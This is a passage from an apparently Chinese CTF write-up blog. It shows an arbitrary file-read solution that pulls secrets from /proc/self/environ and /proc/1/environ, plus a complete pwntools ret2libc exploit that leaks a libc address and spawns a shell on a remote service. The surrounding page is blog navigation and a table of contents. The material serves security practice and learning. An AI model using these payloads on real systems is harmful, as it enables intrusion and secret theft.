+<h3 id="反省："><a href="#反省：" class="headerlink" title="反省："></a>反省：</h3><p><strong>哎。。。。。<font color="red">既然<code>show database()</code>，还有<code>order by</code>都可以，为什么不能想到<code>select</code>被过滤呢</font></strong></p>
+<h1 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h1><p><strong>考察点：<font color="red">隐藏的POST容易读取文件 + JWT提权 + 上传文件</font></strong></p>
+<h2 id="爆破扫描得到："><a href="#爆破扫描得到：" class="headerlink" title="爆破扫描得到："></a>爆破扫描得到：</h2><p><img src="/../images/image-20250521152638411-1747812399046-5.png" alt="image-20250521152638411"></p>
+<h2 id="答案：-2"><a href="#答案：-2" class="headerlink" title="答案："></a>答案：</h2><p>文件读取：</p>
+<p><img src="/../images/image-20250523172952922-1747992593805-1.png" alt="image-20250523172952922"></p>
+<p>随便打开一本书，打开POST传输，发现居然有读取文件！！！</p>
+<p><img src="/../images/image-20250523173142252-1747992703169-3.png" alt="image-20250523173142252"></p>
+<p><strong>真的可以读取文件！！！</strong></p>
+<p><strong>这谁想得到。。。。。</strong></p>
+<h3 id="读取密钥："><a href="#读取密钥：" class="headerlink" title="读取密钥："></a>读取密钥：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_path=/proc/self/environ</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取环境变量获得密钥：<code>th1s_1s_k3y</code></strong></p>
+<p><img src="/../images/image-20250524221123574-1748095884312-5.png" alt="image-20250524221123574"></p>
+<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>读取：<code>/proc/1/environ</code>直接获得flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_path=/proc/<span class="number">1</span>/environ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250524225148122-1748098309093-7.png" alt="image-20250524225148122"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><strong>说实话，不太会<code>pwn</code>，只会一点点</strong></p>
+<p>分两步实现，一先泄露write的地址，<strong>进而找到libc版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi=0x40117e</span><br><span class="line">pop_rdx=0x401182</span><br><span class="line">pop_rsi=0x401180</span><br><span class="line">ret=0x40101a</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*0x18</span><br><span class="line">payload += p64(pop_rdi) + p64(1)</span><br><span class="line">payload += p64(pop_rsi) + p64(write_got)</span><br><span class="line">payload += p64(pop_rdx) + p64(8)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;Libc how to win?\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">write_leak = u64(p.recv(8).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">log.success(f&quot;Leaked write@libc: &#123;hex(write_leak)&#125;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>得到write地址是：<br><strong>最早是想用libcsearcher找到libc地址，但是发现不行，再去网站上找嫌多，所以直接去比赛内的其他题目去找libc文件，发现ez_heap里面存在libc文件，链接查找发现write地址一至，都是870</strong></p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p=remote(&#x27;27.25.151.26&#x27;,29789）</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=0x40117e</span><br><span class="line">pop_rdx=0x401182</span><br><span class="line">pop_rsi=0x401180</span><br><span class="line">ret=0x40101a</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*0x18</span><br><span class="line">payload += p64(pop_rdi) + p64(1)</span><br><span class="line">payload += p64(pop_rsi) + p64(write_got)</span><br><span class="line">payload += p64(pop_rdx) + p64(8)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">p.sendlineafter(b&quot;Libc how to win?\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(8).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">system_libc=libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_libc=libc.search(b&#x27;/bin\x00&#x27;).__next__()</span><br><span class="line">write_libc=libc.symbols[&#x27;write&#x27;]</span><br><span class="line">base=write_addr-write_libc</span><br><span class="line">system=system_libc+base</span><br><span class="line">string=binsh_libc+base</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x18+p64(ret)+p64(pop_rdi)+p64(string)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/reimu and marisa.jpg" data-sizes="auto" alt="再探BUU-MISC" class="lazyload">
+          
+        
+        <a href="/2025/05/19/%E5%86%8D%E6%8E%A2BUU-MISC/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            再探BUU-MISC
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/reimu.webp" data-sizes="auto" alt="SCTF" class="lazyload">
+        
+      
+      <a href="/2025/05/18/SCTF/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          SCTF
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">测试：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">web：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezrce"><span class="toc-number">3.</span> <span class="toc-text">ezrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9Acall-user-func%E6%9C%AC%E8%B4%A8%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.1.</span> <span class="toc-text">考察点：call_user_func本质利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95create-function"><span class="toc-number">3.0.2.</span> <span class="toc-text">1.测试create_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%9A"><span class="toc-number">3.0.3.</span> <span class="toc-text">2.测试文件包含：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">答案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">3.0.5.</span> <span class="toc-text">解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E9%A1%B5%E9%9D%A2%EF%BC%9A"><span class="toc-number">3.0.6.</span> <span class="toc-text">成功页面：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">SSTI：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E5%BD%93%E7%82%B9%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8-%EF%BC%8Cattr%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.</span> <span class="toc-text">考察点：当点被过滤时候使用[]，attr绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9D%E6%AD%A5%E6%9E%84%E9%80%A0"><span class="toc-number">4.0.2.</span> <span class="toc-text">1.初步构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">4.0.3.</span> <span class="toc-text">2.测试：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#attr%E4%B8%8D%E8%A1%8C%EF%BC%8C%E9%82%A3%E5%B0%B1%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">4.0.3.1.</span> <span class="toc-text">attr不行，那就测试中括号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">4.0.4.</span> <span class="toc-text">最终payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjs"><span class="toc-number">5.</span> <span class="toc-text">ezjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.0.1.</span> <span class="toc-text">考察点：前端代码漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezSSRF"><span class="toc-number">6.</span> <span class="toc-text">ezSSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">6.0.1.</span> <span class="toc-text">考察点：SSRF读取任意文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B0%9D%E8%AF%95%E8%BE%93%E5%85%A5%E7%99%BE%E5%BA%A6%EF%BC%9A"><span class="toc-number">6.0.2.</span> <span class="toc-text">1.尝试输入百度：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">6.0.3.</span> <span class="toc-text">直接读取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">签到：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93"><span class="toc-number">7.0.1.</span> <span class="toc-text">考察点：网络传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="toc-number">7.0.2.</span> <span class="toc-text">第一关：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3%EF%BC%9A-l23evel4-php"><span class="toc-number">7.0.3.</span> <span class="toc-text">第二关：&#x2F;l23evel4.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3%EF%BC%9A-levelThree-php"><span class="toc-number">7.0.4.</span> <span class="toc-text">第三关：&#x2F;levelThree.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3%EF%BC%9A-level444Four-php"><span class="toc-number">7.0.5.</span> <span class="toc-text">第四关：&#x2F;level444Four.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3%EF%BC%9A-level4545Five-php"><span class="toc-number">7.0.6.</span> <span class="toc-text">第五关：&#x2F;level4545Five.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E6%8B%86%E8%A7%A3"><span class="toc-number">7.0.7.</span> <span class="toc-text">步骤拆解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3%EF%BC%9A-zzpufinish-php"><span class="toc-number">7.0.8.</span> <span class="toc-text">第六关：&#x2F;zzpufinish.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zqsql"><span class="toc-number">8.</span> <span class="toc-text">zqsql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9Asql%E9%9A%90%E8%97%8F%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%BF%87%E6%BB%A4"><span class="toc-number">8.0.1.</span> <span class="toc-text">考察点：sql隐藏不显示过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">8.0.2.</span> <span class="toc-text">2.手工测试长度：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%ABAI%E5%86%99%E4%B8%AA%E8%84%9A%E6%9C%AC"><span class="toc-number">8.0.3.</span> <span class="toc-text">3.叫AI写个脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%96%91%E7%82%B9%EF%BC%9A"><span class="toc-number">8.0.4.</span> <span class="toc-text">4.疑点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%A7%E7%BB%AD%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">8.0.5.</span> <span class="toc-text">5.继续测试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%88%91%E7%A8%8D%E5%BE%AE%E6%9F%A5%E8%AF%A2%E6%88%91%E7%9A%84%E7%AC%94%E8%AE%B0%EF%BC%9A"><span class="toc-number">8.0.6.</span> <span class="toc-text">6.我稍微查询我的笔记：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%82%A8%E7%8C%9C%E6%80%8E%E4%B9%88%E7%9D%80%EF%BC%8C%E8%BF%98%E7%9C%9F%E7%BB%99%E6%88%91%E6%9F%A5%E5%87%BA%E6%9D%A5%E4%BA%86"><span class="toc-number">8.0.6.1.</span> <span class="toc-text">您猜怎么着，还真给我查出来了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A-1"><span class="toc-number">8.1.</span> <span class="toc-text">答案：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SELECT%E8%A2%AB%E8%BF%87%E6%BB%A4%E3%80%82%E3%80%82%E3%80%82%E9%9A%90%E8%97%8F%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%BF%87%E6%BB%A4"><span class="toc-number">8.1.1.</span> <span class="toc-text">SELECT被过滤。。。隐藏不显示过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%9C%81%EF%BC%9A"><span class="toc-number">8.1.2.</span> <span class="toc-text">反省：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-web1"><span class="toc-number">9.</span> <span class="toc-text">ez_web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%89%AB%E6%8F%8F%E5%BE%97%E5%88%B0%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">爆破扫描得到：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A-2"><span class="toc-number">9.2.</span> <span class="toc-text">答案：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%AF%86%E9%92%A5%EF%BC%9A"><span class="toc-number">9.2.1.</span> <span class="toc-text">读取密钥：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="toc-number">9.2.2.</span> <span class="toc-text">解法2：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">10.</span> <span class="toc-text">PWN</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      Flight-star
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        65.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:01
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">测试：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">web：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezrce"><span class="toc-number">3.</span> <span class="toc-text">ezrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9Acall-user-func%E6%9C%AC%E8%B4%A8%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.1.</span> <span class="toc-text">考察点：call_user_func本质利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95create-function"><span class="toc-number">3.0.2.</span> <span class="toc-text">1.测试create_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%9A"><span class="toc-number">3.0.3.</span> <span class="toc-text">2.测试文件包含：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">答案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">3.0.5.</span> <span class="toc-text">解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E9%A1%B5%E9%9D%A2%EF%BC%9A"><span class="toc-number">3.0.6.</span> <span class="toc-text">成功页面：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">SSTI：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E5%BD%93%E7%82%B9%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8-%EF%BC%8Cattr%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.1.</span> <span class="toc-text">考察点：当点被过滤时候使用[]，attr绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%9D%E6%AD%A5%E6%9E%84%E9%80%A0"><span class="toc-number">4.0.2.</span> <span class="toc-text">1.初步构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number">4.0.3.</span> <span class="toc-text">2.测试：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#attr%E4%B8%8D%E8%A1%8C%EF%BC%8C%E9%82%A3%E5%B0%B1%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">4.0.3.1.</span> <span class="toc-text">attr不行，那就测试中括号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">4.0.4.</span> <span class="toc-text">最终payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjs"><span class="toc-number">5.</span> <span class="toc-text">ezjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E5%89%8D%E7%AB%AF%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.0.1.</span> <span class="toc-text">考察点：前端代码漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezSSRF"><span class="toc-number">6.</span> <span class="toc-text">ezSSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">6.0.1.</span> <span class="toc-text">考察点：SSRF读取任意文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%B0%9D%E8%AF%95%E8%BE%93%E5%85%A5%E7%99%BE%E5%BA%A6%EF%BC%9A"><span class="toc-number">6.0.2.</span> <span class="toc-text">1.尝试输入百度：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%EF%BC%9A"><span class="toc-number">6.0.3.</span> <span class="toc-text">直接读取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">签到：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93"><span class="toc-number">7.0.1.</span> <span class="toc-text">考察点：网络传输</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="toc-number">7.0.2.</span> <span class="toc-text">第一关：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3%EF%BC%9A-l23evel4-php"><span class="toc-number">7.0.3.</span> <span class="toc-text">第二关：&#x2F;l23evel4.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3%EF%BC%9A-levelThree-php"><span class="toc-number">7.0.4.</span> <span class="toc-text">第三关：&#x2F;levelThree.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3%EF%BC%9A-level444Four-php"><span class="toc-number">7.0.5.</span> <span class="toc-text">第四关：&#x2F;level444Four.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3%EF%BC%9A-level4545Five-php"><span class="toc-number">7.0.6.</span> <span class="toc-text">第五关：&#x2F;level4545Five.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E6%8B%86%E8%A7%A3"><span class="toc-number">7.0.7.</span> <span class="toc-text">步骤拆解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3%EF%BC%9A-zzpufinish-php"><span class="toc-number">7.0.8.</span> <span class="toc-text">第六关：&#x2F;zzpufinish.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zqsql"><span class="toc-number">8.</span> <span class="toc-text">zqsql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9%EF%BC%9Asql%E9%9A%90%E8%97%8F%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%BF%87%E6%BB%A4"><span class="toc-number">8.0.1.</span> <span class="toc-text">考察点：sql隐藏不显示过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">8.0.2.</span> <span class="toc-text">2.手工测试长度：</span></a></li><li 